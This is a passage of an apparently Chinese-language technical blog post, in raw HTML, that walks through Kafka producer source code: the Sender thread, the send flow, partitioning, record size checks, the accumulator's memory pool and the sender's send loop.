class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Sender <span class="title">newSender</span><span class="params">(LogContext logContext, KafkaClient kafkaClient, ProducerMetadata metadata)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 缓存请求的个数 默认是5个</span></span><br><span class="line">    <span class="keyword">int</span> maxInflightRequests = configureInflightRequests(producerConfig);</span><br><span class="line">    <span class="comment">// 请求超时时间，默认30s</span></span><br><span class="line">    <span class="keyword">int</span> requestTimeoutMs = producerConfig.getInt(ProducerConfig.REQUEST_TIMEOUT_MS_CONFIG);</span><br><span class="line">    ChannelBuilder channelBuilder = ClientUtils.createChannelBuilder(producerConfig, time, logContext);</span><br><span class="line">    ProducerMetrics metricsRegistry = <span class="keyword">new</span> ProducerMetrics(<span class="keyword">this</span>.metrics);</span><br><span class="line">    Sensor throttleTimeSensor = Sender.throttleTimeSensor(metricsRegistry.senderMetrics);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个客户端对象</span></span><br><span class="line">    <span class="comment">// clientId  客户端id</span></span><br><span class="line">    <span class="comment">// maxInflightRequests  缓存请求的个数 默认是5个</span></span><br><span class="line">    <span class="comment">// RECONNECT_BACKOFF_MS_CONFIG 重试时间</span></span><br><span class="line">    <span class="comment">// RECONNECT_BACKOFF_MAX_MS_CONFIG 总的重试时间</span></span><br><span class="line">    <span class="comment">// 发送缓冲区大小send.buffer.bytes  默认128kb</span></span><br><span class="line">    <span class="comment">// 接收数据缓存 receive.buffer.bytes 默认是32kb</span></span><br><span class="line">    KafkaClient client = kafkaClient != <span class="keyword">null</span> ? kafkaClient : <span class="keyword">new</span> NetworkClient(</span><br><span class="line">            <span class="keyword">new</span> Selector(producerConfig.getLong(ProducerConfig.CONNECTIONS_MAX_IDLE_MS_CONFIG),</span><br><span class="line">                    <span class="keyword">this</span>.metrics, time, <span class="string">"producer"</span>, channelBuilder, logContext),</span><br><span class="line">            metadata,</span><br><span class="line">            clientId,</span><br><span class="line">            maxInflightRequests,</span><br><span class="line">            producerConfig.getLong(ProducerConfig.RECONNECT_BACKOFF_MS_CONFIG),</span><br><span class="line">            producerConfig.getLong(ProducerConfig.RECONNECT_BACKOFF_MAX_MS_CONFIG),</span><br><span class="line">            producerConfig.getInt(ProducerConfig.SEND_BUFFER_CONFIG),</span><br><span class="line">            producerConfig.getInt(ProducerConfig.RECEIVE_BUFFER_CONFIG),</span><br><span class="line">            requestTimeoutMs,</span><br><span class="line">            producerConfig.getLong(ProducerConfig.SOCKET_CONNECTION_SETUP_TIMEOUT_MS_CONFIG),</span><br><span class="line">            producerConfig.getLong(ProducerConfig.SOCKET_CONNECTION_SETUP_TIMEOUT_MAX_MS_CONFIG),</span><br><span class="line">            time,</span><br><span class="line">            <span class="keyword">true</span>,</span><br><span class="line">            apiVersions,</span><br><span class="line">            throttleTimeSensor,</span><br><span class="line">            logContext);</span><br><span class="line">    <span class="comment">// 0 ：生产者发送过来，不需要应答；  1 ：leader收到，应答；  -1 ：leader和isr队列里面所有的都收到了应答</span></span><br><span class="line">    <span class="keyword">short</span> acks = configureAcks(producerConfig, log);</span><br><span class="line">    <span class="comment">// 创建sender线程</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Sender(logContext,</span><br><span class="line">            client,</span><br><span class="line">            metadata,</span><br><span class="line">            <span class="keyword">this</span>.accumulator,</span><br><span class="line">            maxInflightRequests == <span class="number">1</span>,</span><br><span class="line">            producerConfig.getInt(ProducerConfig.MAX_REQUEST_SIZE_CONFIG),</span><br><span class="line">            acks,</span><br><span class="line">            producerConfig.getInt(ProducerConfig.RETRIES_CONFIG),</span><br><span class="line">            metricsRegistry.senderMetrics,</span><br><span class="line">            time,</span><br><span class="line">            requestTimeoutMs,</span><br><span class="line">            producerConfig.getLong(ProducerConfig.RETRY_BACKOFF_MS_CONFIG),</span><br><span class="line">            <span class="keyword">this</span>.transactionManager,</span><br><span class="line">            apiVersions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Sender 对象被放到了一个线程中启动，所有需要点击 newSender()方法中的 Sender，并找到 sender 对象中的 run()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="keyword">while</span> (!forceClose &amp;&amp; ((<span class="keyword">this</span>.accumulator.hasUndrained() || <span class="keyword">this</span>.client.inFlightRequestCount() &gt; <span class="number">0</span>) || hasPendingTransactionalRequests())) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// sender 线程从缓冲区准备拉取数据，刚启动拉不到数据</span></span><br><span class="line">          runOnce();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">          log.error(<span class="string">"Uncaught error in kafka producer I/O thread: "</span>, e);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2、发送数据到缓冲区">2、发送数据到缓冲区</h2><p><img src="http://qnypic.shawncoding.top/blog/202401251335150.png" alt></p><h3 id="2-1-发送总体流程">2.1 发送总体流程</h3><p>从send()方法进入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ProducerRecord&lt;K, V&gt; <span class="title">onSend</span><span class="params">(ProducerRecord&lt;K, V&gt; record)</span> </span>&#123;</span><br><span class="line">    ProducerRecord&lt;K, V&gt; interceptRecord = record;</span><br><span class="line">    <span class="keyword">for</span> (ProducerInterceptor&lt;K, V&gt; interceptor : <span class="keyword">this</span>.interceptors) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 拦截器对数据进行加工</span></span><br><span class="line">            interceptRecord = interceptor.onSend(interceptRecord);</span><br><span class="line">          ......</span><br><span class="line">    <span class="keyword">return</span> interceptRecord;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//从拦截器处理中返回，点击 doSend()方法</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Future&lt;RecordMetadata&gt; <span class="title">doSend</span><span class="params">(ProducerRecord&lt;K, V&gt; record, Callback callback)</span> </span>&#123;</span><br><span class="line">    TopicPartition tp = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        throwIfProducerClosed();</span><br><span class="line">        <span class="comment">// first make sure the metadata for the topic is available</span></span><br><span class="line">        <span class="keyword">long</span> nowMs = time.milliseconds();</span><br><span class="line">        ClusterAndWaitTime clusterAndWaitTime;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取元数据</span></span><br><span class="line">            clusterAndWaitTime = waitOnMetadata(record.topic(), record.partition(), nowMs, maxBlockTimeMs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KafkaException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (metadata.isClosed())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> KafkaException(<span class="string">"Producer closed while send in progress"</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">        nowMs += clusterAndWaitTime.waitedOnMetadataMs;</span><br><span class="line">        <span class="keyword">long</span> remainingWaitMs = Math.max(<span class="number">0</span>, maxBlockTimeMs - clusterAndWaitTime.waitedOnMetadataMs);</span><br><span class="line">        Cluster cluster = clusterAndWaitTime.cluster;</span><br><span class="line">        <span class="comment">// 序列化相关操作</span></span><br><span class="line">        <span class="keyword">byte</span>[] serializedKey;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            serializedKey = keySerializer.serialize(record.topic(), record.headers(), record.key());</span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">// 分区操作</span></span><br><span class="line">        <span class="keyword">int</span> partition = partition(record, serializedKey, serializedValue, cluster);</span><br><span class="line">        tp = <span class="keyword">new</span> TopicPartition(record.topic(), partition);</span><br><span class="line"></span><br><span class="line">        setReadOnly(record.headers());</span><br><span class="line">        Header[] headers = record.headers().toArray();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> serializedSize = AbstractRecords.estimateSizeInBytesUpperBound(apiVersions.maxUsableProduceMagic(),</span><br><span class="line">                compressionType, serializedKey, serializedValue, headers);</span><br><span class="line">        <span class="comment">// 保证数据大小能够传输(序列化后的  压缩后的)</span></span><br><span class="line">        ensureValidRecordSize(serializedSize);</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">// accumulator缓存  追加数据  result是是否添加成功的结果</span></span><br><span class="line">        RecordAccumulator.RecordAppendResult result = accumulator.append(tp, timestamp, serializedKey,</span><br><span class="line">                serializedValue, headers, interceptCallback, remainingWaitMs, <span class="keyword">true</span>, nowMs);</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line">        <span class="comment">// 批次大小已经满了 获取有一个新批次创建</span></span><br><span class="line">        <span class="keyword">if</span> (result.batchIsFull || result.newBatchCreated) &#123;</span><br><span class="line">            log.trace(<span class="string">"Waking up the sender since topic &#123;&#125; partition &#123;&#125; is either full or getting a new batch"</span>, record.topic(), partition);</span><br><span class="line">            <span class="comment">// 唤醒发送线程</span></span><br><span class="line">            <span class="keyword">this</span>.sender.wakeup();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.future;</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-分区选择">2.2 分区选择</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(ProducerRecord&lt;K, V&gt; record, <span class="keyword">byte</span>[] serializedKey, <span class="keyword">byte</span>[] serializedValue, Cluster cluster)</span> </span>&#123;</span><br><span class="line">    Integer partition = record.partition();</span><br><span class="line">    <span class="comment">// 如果指定分区，按照指定分区配置</span></span><br><span class="line">    <span class="keyword">return</span> partition != <span class="keyword">null</span> ?</span><br><span class="line">            partition :</span><br><span class="line">            partitioner.partition(</span><br><span class="line">                    record.topic(), record.key(), serializedKey, record.value(), serializedValue, cluster);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//点击 partition，跳转到 Partitioner 接口,选择默认的分区器 DefaultPartitioner</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(String topic, Object key, <span class="keyword">byte</span>[] keyBytes, Object value, <span class="keyword">byte</span>[] valueBytes, Cluster cluster,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">int</span> numPartitions)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 没有指定key</span></span><br><span class="line">    <span class="keyword">if</span> (keyBytes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 按照粘性分区处理</span></span><br><span class="line">        <span class="keyword">return</span> stickyPartitionCache.partition(topic, cluster);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果指定key,按照key的hashcode值 对分区数求模</span></span><br><span class="line">    <span class="comment">// hash the keyBytes to choose a partition</span></span><br><span class="line">    <span class="keyword">return</span> Utils.toPositive(Utils.murmur2(keyBytes)) % numPartitions;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3-发送消息大小校验">2.3 发送消息大小校验</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureValidRecordSize</span><span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 单条信息最大值 maxRequestSize 1m</span></span><br><span class="line">    <span class="keyword">if</span> (size &gt; maxRequestSize)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RecordTooLargeException(<span class="string">"The message is "</span> + size +</span><br><span class="line">                <span class="string">" bytes when serialized which is larger than "</span> + maxRequestSize + <span class="string">", which is the value of the "</span> +</span><br><span class="line">                ProducerConfig.MAX_REQUEST_SIZE_CONFIG + <span class="string">" configuration."</span>);</span><br><span class="line">    <span class="comment">// totalMemorySize  缓存大小 默认32m</span></span><br><span class="line">    <span class="keyword">if</span> (size &gt; totalMemorySize)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RecordTooLargeException(<span class="string">"The message is "</span> + size +</span><br><span class="line">                <span class="string">" bytes when serialized which is larger than the total memory buffer you have configured with the "</span> +</span><br><span class="line">                ProducerConfig.BUFFER_MEMORY_CONFIG +</span><br><span class="line">                <span class="string">" configuration."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4-内存池">2.4 内存池</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> RecordAppendResult <span class="title">append</span><span class="params">(TopicPartition tp,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">long</span> timestamp,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">byte</span>[] key,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">byte</span>[] value,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 Header[] headers,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 Callback callback,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">long</span> maxTimeToBlock,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">boolean</span> abortOnNewBatch,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">long</span> nowMs)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// check if we have an in-progress batch</span></span><br><span class="line">        <span class="comment">// 获取或者创建一个队列（按照每个主题的分区）</span></span><br><span class="line">        Deque&lt;ProducerBatch&gt; dq = getOrCreateDeque(tp);</span><br><span class="line">        <span class="keyword">synchronized</span> (dq) &#123;</span><br><span class="line">            <span class="keyword">if</span> (closed)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> KafkaException(<span class="string">"Producer closed while send in progress"</span>);</span><br><span class="line">            <span class="comment">// 尝试向队列里面添加数据（正常添加不成功）</span></span><br><span class="line">            RecordAppendResult appendResult = tryAppend(timestamp, key, value, headers, callback, dq, nowMs);</span><br><span class="line">            <span class="keyword">if</span> (appendResult != <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">return</span> appendResult;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// we don't have an in-progress record batch try to allocate a new batch</span></span><br><span class="line">        <span class="keyword">if</span> (abortOnNewBatch) &#123;</span><br><span class="line">            <span class="comment">// Return a result that will cause another call to append.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> RecordAppendResult(<span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span> maxUsableMagic = apiVersions.maxUsableProduceMagic();</span><br><span class="line">        <span class="comment">// this.batchSize 默认16k    数据大小17k</span></span><br><span class="line">        <span class="keyword">int</span> size = Math.max(<span class="keyword">this</span>.batchSize, AbstractRecords.estimateSizeInBytesUpperBound(maxUsableMagic, compression, key, value, headers));</span><br><span class="line">        log.trace(<span class="string">"Allocating a new &#123;&#125; byte message buffer for topic &#123;&#125; partition &#123;&#125; with remaining timeout &#123;&#125;ms"</span>, size, tp.topic(), tp.partition(), maxTimeToBlock);</span><br><span class="line">        <span class="comment">// 申请内存  内存池分配内存  双端队列</span></span><br><span class="line">        buffer = free.allocate(size, maxTimeToBlock);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the current time in case the buffer allocation blocked above.</span></span><br><span class="line">        nowMs = time.milliseconds();</span><br><span class="line">        <span class="keyword">synchronized</span> (dq) &#123;</span><br><span class="line">            <span class="comment">// Need to check if producer is closed again after grabbing the dequeue lock.</span></span><br><span class="line">            <span class="keyword">if</span> (closed)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> KafkaException(<span class="string">"Producer closed while send in progress"</span>);</span><br><span class="line"></span><br><span class="line">            RecordAppendResult appendResult = tryAppend(timestamp, key, value, headers, callback, dq, nowMs);</span><br><span class="line">            <span class="keyword">if</span> (appendResult != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// Somebody else found us a batch, return the one we waited for! Hopefully this doesn't happen often...</span></span><br><span class="line">                <span class="keyword">return</span> appendResult;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 封装内存buffer</span></span><br><span class="line">            MemoryRecordsBuilder recordsBuilder = recordsBuilder(buffer, maxUsableMagic);</span><br><span class="line">            <span class="comment">// 再次封装（得到真正的批次大小）</span></span><br><span class="line">            ProducerBatch batch = <span class="keyword">new</span> ProducerBatch(tp, recordsBuilder, nowMs);</span><br><span class="line">            FutureRecordMetadata future = Objects.requireNonNull(batch.tryAppend(timestamp, key, value, headers,</span><br><span class="line">                    callback, nowMs));</span><br><span class="line">            <span class="comment">// 向队列的末尾添加批次</span></span><br><span class="line">            dq.addLast(batch);</span><br><span class="line">            incomplete.add(batch);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Don't deallocate this buffer in the finally block as it's being used in the record batch</span></span><br><span class="line">            buffer = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> RecordAppendResult(future, dq.size() &gt; <span class="number">1</span> || batch.isFull(), <span class="keyword">true</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (buffer != <span class="keyword">null</span>)</span><br><span class="line">            free.deallocate(buffer);</span><br><span class="line">        appendsInProgress.decrementAndGet();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、sender-线程发送数据">3、sender 线程发送数据</h2><p><img src="http://qnypic.shawncoding.top/blog/202401251335151.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">runOnce</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 事务相关操作</span></span><br><span class="line">    <span class="keyword">if</span> (transactionManager != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            transactionManager.maybeResolveSequences();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// do not continue sending if the transaction manager is in a failed state</span></span><br><span class="line">            <span class="keyword">if</span> (transactionManager.hasFatalError()) &#123;</span><br><span class="line">                RuntimeException lastError = transactionManager.lastError();</span><br><span class="line">                <span class="keyword">if</span> (lastError != <span class="keyword">null</span>)</span><br><span class="line">                    maybeAbortBatches(lastError);</span><br><span class="line">                client.poll(retryBackoffMs, time.milliseconds());</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check whether we need a new producerId. If so, we will enqueue an InitProducerId</span></span><br><span class="line">            <span class="comment">// request which will be sent below</span></span><br><span class="line">            transactionManager.bumpIdempotentEpochAndResetIdIfNeeded();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (maybeSendAndPollTransactionalRequest()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AuthenticationException e) &#123;</span><br><span class="line">            <span class="comment">// This is already logged as error, but propagated here to perform any clean ups.</span></span><br><span class="line">            log.trace(<span class="string">"Authentication exception while processing transactional request"</span>, e);</span><br><span class="line">            transactionManager.authenticationFailed(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> currentTimeMs = time.milliseconds();</span><br><span class="line">    <span class="comment">// 发送数据</span></span><br><span class="line">    <span class="keyword">long</span> pollTimeout = sendProducerData(currentTimeMs);</span><br><span class="line">    <span class="comment">// 获取发送结果</span></span><br><span class="line">    client.poll(pollTimeout, currentTimeMs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">long</span> <span class="title">sendProducerData</span><span class="params">(<span class="keyword">long</span> now)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取元数据</span></span><br><span class="line">    Cluster cluster = metadata.fetch();</span><br><span class="line">    <span class="comment">// get the list of partitions with data ready to send</span></span><br><span class="line">    <span class="comment">// 1、判断32m缓存是否准备好</span></span><br><span class="line">    RecordAccumulator.ReadyCheckResult result = <span class="keyword">this</span>.accumulator.ready(cluster, now);</span><br><span class="line">    <span class="comment">// 如果 Leader 信息不知道，是不能发送数据的</span></span><br><span class="line">    <span class="comment">// if there are any partitions whose leaders are not known yet, force metadata update</span></span><br><span class="line">    <span class="keyword">if</span> (!result.unknownLeaderTopics.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// The set of topics with unknown leader contains topics with leader election pending as well as</span></span><br><span class="line">        <span class="comment">// topics which may have expired. Add the topic again to metadata to ensure it is included</span></span><br><span class="line">        <span class="comment">// and request metadata update, since there are messages to send to the topic.</span></span><br><span class="line">        <span class="keyword">for</span> (String topic : result.unknownLeaderTopics)</span><br><span class="line">            <span class="keyword">this</span>.metadata.add(topic, now);</span><br><span class="line"></span><br><span class="line">        log.debug(<span class="string">"Requesting metadata update due to unknown leader topics from the batched records: &#123;&#125;"</span>,</span><br><span class="line">            result.unknownLeaderTopics);</span><br><span class="line">        <span class="keyword">this</span>.metadata.requestUpdate();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create produce requests</span></span><br><span class="line">    <span class="comment">// 发送每个节点数据，进行封装,这样一个分区的就可以打包一起发送</span></span><br><span class="line">    Map&lt;Integer, List&lt;ProducerBatch&gt;&gt; batches = <span class="keyword">this</span>.accumulator.drain(cluster, result.readyNodes, <span class="keyword">this</span>.maxRequestSize, now);</span><br><span class="line">    addToInflightBatches(batches);</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送请求</span></span><br><span class="line">    